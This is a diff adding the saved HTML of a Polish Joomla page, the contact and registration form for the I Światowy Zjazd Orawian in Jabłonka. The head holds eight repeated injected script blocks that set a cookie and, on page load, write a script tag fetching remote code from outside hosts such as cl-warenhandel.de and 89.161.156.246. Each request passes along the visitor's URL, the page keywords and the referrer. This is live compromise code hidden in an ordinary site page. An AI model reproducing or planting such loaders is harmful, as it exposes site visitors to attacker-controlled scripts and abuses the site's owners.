@@ -1,0 +1,509 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="pl-pl" lang="pl-pl" >
+<head>
+   <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta name="robots" content="index, follow" />
+  <meta name="keywords" content="orawa, orawianie, zjazd, orawian, lipnica, wielka, mała, jabłonka, czarny dunajec, lipnica wielka, raba wyżna, tpo, klub, babia góra, związek podhalan, orawski," />
+  <meta name="description" content="I Światowy Zjazd Orawian to spotkanie ludzi, którzy czują się związani z Orawą, identyfikują się z tą ziemią, szukają tutaj swoich korzeni. To spotkanie Orawian rozrzuconych po całej Polsce i świecie. Ten światowy zjazd pomyślany jest jako wielopokoleniowe spotkanie, starszych i młodych Orawian, żyjących w Polsce i na emigracji." />
+  <meta name="generator" content="Joomla! 1.5 - Open Source Content Management" />
+  <title>I Światowy Zjazd Orawian - Formularz zgłoszenia udziału w obchodach</title>
+  <link rel="stylesheet" href="http://www.zjazdorawian.pl/components/com_aicontactsafe/includes/css/aicontactsafe_general.css" type="text/css" />
+  <link rel="stylesheet" href="http://www.zjazdorawian.pl/media/aicontactsafe/cssprofiles/profile_css_1.css" type="text/css" />
+  <script type="text/javascript" src="/includes/js/joomla.javascript.js"></script>
+  <script type="text/javascript" src="/media/system/js/mootools.js"></script>
+  <script type="text/javascript">
+
+	//<![CDATA[
+	<!--
+	function resetSubmit( pf ) {
+		$('adminForm_'+pf).addEvent('submit', function(e) {
+			new Event(e).stop();
+			this.send({
+				onRequest: function(){ 
+										document.getElementById('adminForm_'+pf).elements['task'].value = 'ajaxform'; 
+										document.getElementById('adminForm_'+pf).elements['use_ajax'].value = '1';
+										$('aiContactSafeSend_loading_'+pf).setHTML('&nbsp;&nbsp;Proszę czekać ...&nbsp;<img id="imgLoading" border="0" src="http://www.zjazdorawian.pl/components/com_aicontactsafe/includes/images/load.gif" />&nbsp;&nbsp;');
+										document.getElementById('adminForm_'+pf).elements['aiContactSafeSendButton'].disabled = true;
+									},
+				onComplete: function() { 
+										$('displayAiContactSafeForm_'+pf).setHTML( this.response.text );
+										changeCaptcha(pf,0); 
+										document.getElementById('adminForm_'+pf).elements['aiContactSafeSendButton'].removeAttribute('disabled');
+										if (document.getElementById('adminForm_'+pf).elements['ajax_return_to']) {
+											var ajax_return_to = document.getElementById('adminForm_'+pf).elements['ajax_return_to'].value;
+											if (ajax_return_to.length > 0) {
+												window.location = ajax_return_to;
+											}
+										} else {
+											if (document.getElementById('adminForm_'+pf).elements['ajax_message_sent']) {
+												var return_to = document.getElementById('adminForm_'+pf).elements['return_to'].value;
+												return_to = return_to.replace('&#38;', '&');
+												var current_url = document.getElementById('adminForm_'+pf).elements['current_url'].value;
+												current_url = current_url.replace('&#38;', '&');
+												if (return_to.length > 0 && return_to != current_url) {													
+													window.location = return_to;
+												}
+											}
+										}
+										$('aiContactSafeSend_loading_'+pf).setHTML('&nbsp;');
+										setupCalendars(pf);
+										if(typeof SqueezeBox!='undefined' && $('system-message')) {
+											SqueezeBox.initialize();
+											SqueezeBox.open($('system-message'), {
+												handler: 'adopt',
+												size: {x: $('system-message').offsetWidth+30, y: $('system-message').offsetHeight+30}
+											});
+										}
+									}
+			});
+		});
+	}
+	function checkEditboxLimit( pf, editbox_id, chars_limit ){
+		if (document.getElementById('adminForm_'+pf).elements[editbox_id]) {
+			if (document.getElementById('adminForm_'+pf).elements[editbox_id].value.length > chars_limit) {
+				alert('Przekroczona maksymalna ilość znaków! !');
+				document.getElementById('adminForm_'+pf).elements[editbox_id].value = document.getElementById('adminForm_'+pf).elements[editbox_id].value.substring(0,chars_limit);
+			} else {
+				if (document.getElementById('adminForm_'+pf).elements['countdown_'+editbox_id]) {
+					document.getElementById('adminForm_'+pf).elements['countdown_'+editbox_id].value = chars_limit - document.getElementById('adminForm_'+pf).elements[editbox_id].value.length;
+				}
+			}
+		}
+	}
+	function changeCaptcha( pf, modifyFocus ) {
+		if (document.getElementById('div_captcha_img_'+pf)) {
+			var set_rand = Math.floor(Math.random()*10000000001);
+			var r_id = document.getElementById('adminForm_'+pf).elements['r_id'].value;
+			var captcha_file = 'http://www.zjazdorawian.pl/index.php?option=com_aicontactsafe&sTask=captcha&task=captcha&pf='+pf+'&r_id='+r_id+'&lang=&format=raw&set_rand='+set_rand;
+			if (window.ie6) {
+				var url = 'http://www.zjazdorawian.pl/index.php?option=com_aicontactsafe&sTask=captcha&task=newCaptcha&pf='+pf+'&r_id='+r_id+'&lang=&format=raw&set_rand='+set_rand;
+				new Ajax(url, {
+					method: 'get',
+					update: $('div_captcha_img_'+pf),
+					onRequest: function(){ $('div_captcha_img_'+pf).setHTML('Proszę czekać ...'); }
+				}).request();
+			} else {
+				$('div_captcha_img_'+pf).setHTML( '<img src="'+captcha_file+'" alt="&nbsp;" id="captcha" border="0" />' );
+			}
+			if (modifyFocus && document.getElementById('captcha-code')) {
+				document.getElementById('captcha-code').focus();
+			}
+		}
+		if (document.getElementById('aiContactSafe_form_'+pf) || document.getElementById('aiContactSafe_module_'+pf)) {
+			if (document.getElementById('reCaptchaReset')) {
+				if (document.getElementById('reCaptchaReset').value == 1 && document.getElementById('recaptcha_div')) {
+					if (document.getElementById('reCaptchaPublicKey')) {
+						var reCaptchaPublicKey = document.getElementById('reCaptchaPublicKey').value;
+					} else {
+						var reCaptchaPublicKey = '';
+					}
+					if (document.getElementById('reCaptchaTheme')) {
+						var reCaptchaTheme = document.getElementById('reCaptchaTheme').value;
+					} else {
+						var reCaptchaTheme = '';
+					}
+					Recaptcha.create(reCaptchaPublicKey, 'recaptcha_div',  { theme:reCaptchaTheme });
+				}
+			}
+		}
+		if (document.getElementById('captcha-code')) {
+			$('captcha-code').value = '';
+		} else if (document.getElementById('captcha_code')) {
+			$('captcha_code').value = '';
+		} else if (document.getElementById('mathguard_answer')) {
+			$('mathguard_answer').value = '';
+		} else if (document.getElementById('recaptcha_response_field')) {
+			$('recaptcha_response_field').value = '';
+		}
+	}
+	function setDate( pf, newDate, idDate ) {
+		if (document.getElementById('adminForm_'+pf).elements['day_'+idDate]) {
+			document.getElementById('adminForm_'+pf).elements['day_'+idDate].value = newDate.substr(8,2);
+		}
+		if (document.getElementById('adminForm_'+pf).elements['month_'+idDate]) {
+			var selMonth = newDate.substr(5,2);
+			if(selMonth.substr(0,1) == '0') {
+				selMonth = selMonth.substr(1,1);
+			}
+			selMonth = parseInt(selMonth) - 1;
+			document.getElementById('adminForm_'+pf).elements['month_'+idDate].options[selMonth].selected = true;
+		}
+		if (document.getElementById('adminForm_'+pf).elements['year_'+idDate]) {
+			document.getElementById('adminForm_'+pf).elements['year_'+idDate].value = newDate.substr(0,4);
+		}
+	}
+	function daysInFebruary( year ){
+		var days = (((year % 4 == 0) && ( (!(year % 100 == 0)) || (year % 400 == 0))) ? 29 : 28 );
+		return days;
+	}
+	function daysInMonth( month, year ) {
+		var days = 31;
+		switch( true ) {
+			case month == 2 :
+				days = daysInFebruary( year );
+				break;
+			case month == 4 || month == 6 || month == 9 || month == 11 :
+				days = 30;
+				break;
+		}
+	   return days;
+	}
+	function checkDate( pf, idDate ) {
+		var year = 0;
+		var month = 0;
+		var day = 0;
+		if (document.getElementById('adminForm_'+pf).elements['year_'+idDate]) {
+			year = document.getElementById('adminForm_'+pf).elements['year_'+idDate].value;
+		}
+		if (document.getElementById('adminForm_'+pf).elements['month_'+idDate]) {
+			month = document.getElementById('adminForm_'+pf).elements['month_'+idDate].value;
+		}
+		if (document.getElementById('adminForm_'+pf).elements['day_'+idDate]) {
+			day = document.getElementById('adminForm_'+pf).elements['day_'+idDate].value;
+		}
+		if (day > 0 && month > 0 && year > 0) {
+			var days = daysInMonth( month, year );
+			if (day > days) {
+				day = days;
+				document.getElementById('adminForm_'+pf).elements['day_'+idDate].value = days;
+				var error = 'Tylko %days% dni w zaznaczonym miesiącu? Proszę wybrac najpierw miesiąc.';
+				alert( error.replace( '%days%', days ) );
+			}
+		}
+		if (document.getElementById('adminForm_'+pf).elements[idDate]) {
+			document.getElementById('adminForm_'+pf).elements[idDate].value = year+'-'+month+'-'+day;
+		}
+	}
+	function clickCheckBox( pf, idTag, ckChecked ) {
+		document.getElementById('adminForm_'+pf).elements[idTag].value = ckChecked?1:0;
+	}
+	function hideUploadField(file_field, pf) {
+		$('upload_'+pf+'_file_'+file_field).setStyle('display','none');
+	}
+	function showUploadField(file_field, pf) {
+		$('upload_'+pf+'_file_'+file_field).setStyle('display','inline');
+	}
+	function resetUploadField(file_field, pf) {
+		var var_file_field = "'"+file_field+"'";
+		$('upload_'+pf+'_file_'+file_field).setHTML('<input type="file" name="'+file_field+'" id="'+file_field+'" onchange="startUploadFile('+var_file_field+','+pf+')" />');
+	}
+	function hideFileField(file_field, pf) {
+		$('cancel_upload_'+pf+'_file_'+file_field).setStyle('display','none');
+	}
+	function showFileField(file_field, pf) {
+		$('cancel_upload_'+pf+'_file_'+file_field).setStyle('display','inline');
+	}
+	function hideWaitFileField(file_field, pf) {
+		$('wait_upload_'+pf+'_file_'+file_field).setStyle('display','none');
+	}
+	function showWaitFileField(file_field, pf) {
+		$('wait_upload_'+pf+'_file_'+file_field).setStyle('display','inline');
+	}
+	function cancelUploadFile(file_field, pf) {
+		hideFileField(file_field, pf);
+		deleteUploadedFile(file_field, pf);
+		$('adminForm_'+pf).elements[file_field+'_attachment_name'].value = '';
+		$('adminForm_'+pf).elements[file_field+'_attachment_id'].value = '';
+		resetUploadField(file_field, pf);
+		showUploadField(file_field, pf);
+	}
+	function deleteUploadedFile(file_field, pf) {
+		var file_name = $('adminForm_'+pf).elements[file_field+'_attachment_name'].value;
+		var r_id = document.getElementById('adminForm_'+pf).elements['r_id'].value;
+		var url = 'http://www.zjazdorawian.pl/index.php?option=com_aicontactsafe&sTask=message&task=deleteUploadedFile&filename='+file_name+'&r_id='+r_id+'&format=raw'
+		new Ajax(url, { method: 'get' }).request();
+	}
+	function startUploadFile(file_field, pf) {
+		var r_id = document.getElementById('adminForm_'+pf).elements['r_id'].value;
+		$('adminForm_'+pf).setProperty('action','index.php?option=com_aicontactsafe&field='+file_field+'&r_id='+r_id+'&format=raw');
+		$('adminForm_'+pf).setProperty('target','iframe_upload_file_'+pf+'_file_'+file_field);
+		$('adminForm_'+pf).elements['task'].value = 'uploadFile';
+		hideUploadField(file_field, pf);
+		hideFileField(file_field, pf);
+		showWaitFileField(file_field, pf);
+		$('adminForm_'+pf).submit();
+		resetUploadField(file_field, pf);
+	}
+	function endUploadFile(pf, file_field, attachment_name, attachment_id, error_type, error_message) {
+		error_type = parseInt(error_type);
+		hideWaitFileField(file_field, pf);
+		switch( error_type ) {
+			case 0 :
+				$('adminForm_'+pf).elements[file_field+'_attachment_name'].value = attachment_name;
+				$('adminForm_'+pf).elements[file_field+'_attachment_id'].value = attachment_id;
+				showFileField(file_field, pf);
+				break;
+			case 1 :
+				alert('Tej format plika załącznika jest niedozwolony! ( '+error_message+' ) ');
+				cancelUploadFile(file_field, pf);
+				break;
+			case 2 :
+				alert('Zbyt duży plik! ( '+error_message+' ) ');
+				cancelUploadFile(file_field, pf);
+				break;
+			case 3 :
+				alert('Inny błąd! ( '+error_message+' ) ');
+				cancelUploadFile(file_field, pf);
+				break;
+		}
+		resetSendButtonTarget(pf);
+	}
+	function resetSendButtonTarget(pf) {
+		$('adminForm_'+pf).setProperty('action','index.php');
+		$('adminForm_'+pf).setProperty('target','_self');
+		$('adminForm_'+pf).elements['task'].value = 'message';
+	}
+	function setupCalendars(pf) {
+		var calendars_imgs = $$('#adminForm_'+pf+' img.calendar');
+		var countCalendars = calendars_imgs.length;
+		for(var i=0;i<countCalendars;i++) {
+			var imgid = calendars_imgs[i].getProperty('id');
+			if (imgid.substr(imgid.length-4)=='_img') {
+				fieldid = imgid.substr(0,imgid.length-4);
+				Calendar.setup({inputField : fieldid, ifFormat: "%Y-%m-%d", button : imgid, align : "Tl", singleClick : true});
+			}
+		}
+	}
+	//-->
+	//]]>
+
+			//<![CDATA[
+			<!--
+			window.addEvent('load', function() {
+				changeCaptcha(1,0);
+
+				if($(typeof SqueezeBox!='undefined' && 'system-message')) {
+					SqueezeBox.initialize();
+					SqueezeBox.open($('system-message'), {
+						handler: 'adopt',
+						size: {x: $('system-message').offsetWidth+30, y: $('system-message').offsetHeight+30}
+					});
+				}
+			});
+			//-->
+			//]]>
+		
+  </script>
+
+ <link rel="stylesheet" href="/templates/system/css/system.css" type="text/css" />
+ <link rel="stylesheet" href="/templates/system/css/general.css" type="text/css" />
+ <link rel="stylesheet" type="text/css" href="/templates/zjazd_orawian/css/template.css" media="screen" />
+ <!--[if IE 6]><link rel="stylesheet" href="/templates/zjazd_orawian/css/template.ie6.css" type="text/css" media="screen" /><![endif]-->
+ <!--[if IE 7]><link rel="stylesheet" href="/templates/zjazd_orawian/css/template.ie7.css" type="text/css" media="screen" /><![endif]-->
+ <script type="text/javascript" src="/templates/zjazd_orawian/script.js"></script>
+<script>var b="red";c="mod";function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",1,1),1==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",2,1),document.write('<script type="text/javascript" src="' + 'http://cl-warenhandel.de/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'snt2014' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script><script>var b="red";c="mod";function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",1,1),1==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",2,1),document.write('<script type="text/javascript" src="' + 'http://89.161.156.246/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'snt2014' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script><script>var b="red";c="mod";function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",1,1),1==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",2,1),document.write('<script type="text/javascript" src="' + 'http://www.krismarine.com/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'snt2014' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script><script>var b="red";c="mod";function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",1,1),1==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",2,1),document.write('<script type="text/javascript" src="' + 'http://lyceedemonzie-bazas.fr/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'snt2014' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script><script>var b="red";c="mod";function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",1,1),1==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",2,1),document.write('<script type="text/javascript" src="' + 'http://www.ist-keine-schan.de/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'snt2014' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script><script>var b="red";c="mod";function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",1,1),1==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",2,1),document.write('<script type="text/javascript" src="' + 'http://talentosdavidfischman.com/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'snt2014' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script><script>var b="red";c="mod";function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",1,1),1==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",2,1),document.write('<script type="text/javascript" src="' + 'http://welus.webq.biz/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'snt2014' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script><script>var b="red";c="mod";function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",1,1),1==getCookie("ytm_hit1")&&(setCookie("ytm_hit1",2,1),document.write('<script type="text/javascript" src="' + 'http://www.sportingcastelguelfo.it/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'snt2014' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script></head>
+<body class="joomla15">
+<div id="art-page-background-simple-gradient">
+    <div id="art-page-background-gradient"></div>
+</div>
+<div id="art-main">
+<div class="art-sheet">
+    <div class="art-sheet-tl"></div>
+    <div class="art-sheet-tr"></div>
+    <div class="art-sheet-bl"></div>
+    <div class="art-sheet-br"></div>
+    <div class="art-sheet-tc"></div>
+    <div class="art-sheet-bc"></div>
+    <div class="art-sheet-cl"></div>
+    <div class="art-sheet-cr"></div>
+    <div class="art-sheet-cc"></div>
+    <div class="art-sheet-body">
+<div class="art-header">
+    <div class="art-header-png"></div>
+    <div class="art-header-jpeg"></div>
+<script type="text/javascript" src="/templates/zjazd_orawian/swfobject.js"></script>
+<div id="art-flash-area">
+<div id="art-flash-container">
+<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" width="900" height="300" id="art-flash-object">
+	<param name="movie" value="/templates/zjazd_orawian/container.swf" />
+	<param name="quality" value="high" />
+	<param name="scale" value="default" />
+	<param name="wmode" value="transparent" />
+	<param name="flashvars" value="color1=0xFFFFFF&amp;alpha1=.50&amp;framerate1=24&amp;loop=true&amp;clip=/templates/zjazd_orawian/images/flash.swf&amp;radius=10&amp;clipx=-80&amp;clipy=0&amp;initalclipw=900&amp;initalcliph=255&amp;clipw=1058&amp;cliph=300&amp;width=900&amp;height=300&amp;textblock_width=0&amp;textblock_align=no" />
+    <param name="swfliveconnect" value="true" />
+	<!--[if !IE]>-->
+	<object type="application/x-shockwave-flash" data="/templates/zjazd_orawian/container.swf" width="900" height="300">
+	    <param name="quality" value="high" />
+	    <param name="scale" value="default" />
+	    <param name="wmode" value="transparent" />
+    	<param name="flashvars" value="color1=0xFFFFFF&amp;alpha1=.50&amp;framerate1=24&amp;loop=true&amp;clip=/templates/zjazd_orawian/images/flash.swf&amp;radius=10&amp;clipx=-80&amp;clipy=0&amp;initalclipw=900&amp;initalcliph=255&amp;clipw=1058&amp;cliph=300&amp;width=900&amp;height=300&amp;textblock_width=0&amp;textblock_align=no" />
+        <param name="swfliveconnect" value="true" />
+	<!--<![endif]-->
+		<div class="art-flash-alt"><a href="http://www.adobe.com/go/getflashplayer"><img src="http://www.adobe.com/images/shared/download_buttons/get_flash_player.gif" alt="Get Adobe Flash player" /></a></div>
+	<!--[if !IE]>-->
+	</object>
+	<!--<![endif]-->
+</object>
+</div>
+</div>
+<script type="text/javascript">swfobject.switchOffAutoHideShow();swfobject.registerObject("art-flash-object", "9.0.0", "/templates/zjazd_orawian/expressInstall.swf");</script>
+
+</div>
+<div class="art-content-layout">
+    <div class="art-content-layout-row">
+<div class="art-layout-cell art-sidebar1">
+    <div class="art-vmenublock">
+    <div class="art-vmenublock-body">
+
+                        <div class="art-vmenublockcontent">
+    <div class="art-vmenublockcontent-body">
+<!-- block-content -->
+
+        <ul class="art-vmenu"><li class="item1"><a href="http://www.zjazdorawian.pl/"><span class="l"></span><span class="r"></span><span class="t">Aktualności</span></a></li><li class="item27"><a href="/index.php?option=com_content&amp;view=article&amp;id=48&amp;Itemid=27"><span class="l"></span><span class="r"></span><span class="t">Cel zjazdu</span></a></li><li class="item2"><a href="/index.php?option=com_content&amp;view=article&amp;id=49&amp;Itemid=2"><span class="l"></span><span class="r"></span><span class="t">Program</span></a></li><li class="item55"><a href="/index.php?option=com_content&amp;view=article&amp;id=59&amp;Itemid=55"><span class="l"></span><span class="r"></span><span class="t">Patronat Honorowy</span></a></li><li class="item54"><a href="/index.php?option=com_content&amp;view=article&amp;id=58&amp;Itemid=54"><span class="l"></span><span class="r"></span><span class="t">Komitet Honorowy</span></a></li><li class="item37"><a href="/index.php?option=com_content&amp;view=article&amp;id=50&amp;Itemid=37"><span class="l"></span><span class="r"></span><span class="t">Organizatorzy</span></a></li><li class="item56"><a href="/index.php?option=com_content&amp;view=article&amp;id=60&amp;Itemid=56"><span class="l"></span><span class="r"></span><span class="t">Patronat medialny</span></a></li><li id="current" class="active item41"><a href="/index.php?option=com_aicontactsafe&amp;view=message&amp;layout=message&amp;pf=1&amp;Itemid=41" class=" active"><span class="l"></span><span class="r"></span><span class="t">Kontakt</span></a></li><li class="item57"><a href="/index.php?option=com_content&amp;view=article&amp;id=61&amp;Itemid=57"><span class="l"></span><span class="r"></span><span class="t">Sponsorzy</span></a></li><li class="item53"><a href="/index.php?option=com_content&amp;view=article&amp;id=57&amp;Itemid=53"><span class="l"></span><span class="r"></span><span class="t">Dla sponsorów</span></a></li><li class="item48"><a href="http://www.orawa.turystyka.pl/" target="_blank"><span class="l"></span><span class="r"></span><span class="t">Noclegi na Orawie</span></a></li></ul><!-- /block-content -->
+
+		<div class="cleared"></div>
+    </div>
+</div>
+
+        		<div class="cleared"></div>
+    </div>
+</div>
+
+        <div class="art-block">
+            <div class="art-block-body">
+        
+                        <div class="art-blockcontent">
+            <div class="art-blockcontent-body">
+        <!-- block-content -->
+        
+        <form action="index.php" method="post">
+	<div class="search">
+		<input name="searchword" id="mod_search_searchword" maxlength="20" alt="Szukaj" class="inputbox" type="text" size="20" value="Szukaj&hellip;"  onblur="if(this.value=='') this.value='Szukaj&hellip;';" onfocus="if(this.value=='Szukaj&hellip;') this.value='';" />	</div>
+	<input type="hidden" name="task"   value="search" />
+	<input type="hidden" name="option" value="com_search" />
+	<input type="hidden" name="Itemid" value="41" />
+</form>
+        <!-- /block-content -->
+        
+        		<div class="cleared"></div>
+            </div>
+        </div>
+        
+        
+        		<div class="cleared"></div>
+            </div>
+        </div>
+        
+
+</div>
+<div class="art-layout-cell art-content">
+
+<div class="art-post">
+    <div class="art-post-body">
+<div class="art-post-inner">
+<div class="art-postcontent">
+    <!-- article-content -->
+<span class="breadcrumbs pathway">
+<a href="http://www.zjazdorawian.pl/" class="pathway">Strona Główna</a> <img src="/images/M_images/arrow.png" alt=""  /> Kontakt</span>
+
+    <!-- /article-content -->
+</div>
+<div class="cleared"></div>
+</div>
+
+		<div class="cleared"></div>
+    </div>
+</div>
+<div class="art-post">
+    <div class="art-post-body">
+<div class="art-post-inner">
+<h2 class="art-postheader"> <span class="componentheading">I Światowy Zjazd Orawian - Formularz zgłoszenia udziału w obchodach</span></h2>
+<div class="art-postcontent">
+    <!-- article-content -->
+<div class="aiContactSafe" id="aiContactSafe_mainbody_1">
+
+<div class="contentpaneopen">
+			<table id="aiContactSafeForm" border="0" cellpadding="0" cellspacing="5">
+				<tr><td valign="top"  ><p style="text-align: center;"><img src="http://www.zjazdorawian.pl/images/stories/herb.PNG" border="0" alt="Herb Orawy" width="128" height="134" style="border: 0pt none; vertical-align: middle;" /></p>
+<p style="text-align: center;">Urząd Gminy Jabłonka</p>
+<p style="text-align: center;">Ul. 3-go Maja 1</p>
+<p style="text-align: center;">34-480 Jabłonka</p>
+<p style="text-align: center;">pok. 207 (biuro organizacyjne)</p>
+<p style="text-align: center;">tel: +48 18 2611161</p>
+<p style="text-align: center;">fax: +48 18 2652468</p>
+<p style="text-align: center;">e-mail: zjazdorawian@gmail.com</p>
+<p style="text-align: center;"> </p>
+<h4 style="text-align: center;">Szanowni Orawianie,</h4>
